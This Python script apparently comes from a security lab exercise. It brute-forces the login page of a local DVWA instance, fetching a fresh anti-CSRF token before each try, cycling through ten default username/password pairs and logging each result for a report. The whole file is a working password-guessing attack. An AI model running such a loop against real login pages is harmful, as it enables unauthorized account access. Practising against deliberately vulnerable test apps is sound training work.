from bs4 import BeautifulSoup

BASE_URL = "http://localhost:8080/dvwa/"


def get_fresh_token(session, login_url):
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    if token_input:
        return token_input["value"]
    return ""


def brute_force_login(session, login_url):

    print("\nStarting Brute Force Attack Simulation...\n")

    credentials = [
        ("admin",  "admin"),
        ("admin",  "password"),
        ("admin",  "123456"),
        ("admin",  "admin123"),
        ("admin",  "qwerty"),
        ("user",   "user"),
        ("user",   "password"),
        ("root",   "root"),
        ("test",   "test"),
        ("guest",  "guest"),
    ]

    all_attempts  = []   # stores ALL attempts for report
    found_cred    = None # stores the successful credential

    for username, password in credentials:

        token = get_fresh_token(session, login_url)

        data = {
            "username":   username,
            "password":   password,
            "Login":      "Login",
            "user_token": token
        }

        response = session.post(login_url, data=data)

        if "Login failed" not in response.text and "Welcome" in response.text:
            status   = "SUCCESS"
            severity = "High"
            print(f"[VULNERABLE] Weak credentials found: {username}:{password}")
            # Save successful credential
            found_cred = (username, password)
        else:
            status   = "Failed"
            severity = "None"
            print(f"[FAILED] {username}:{password}")

        # Add every attempt to the list
        all_attempts.append((username, password, status, severity))

    if not found_cred:
        print("No weak credentials detected.")

    # Return both all attempts and found credential
    return all_attempts, found_cred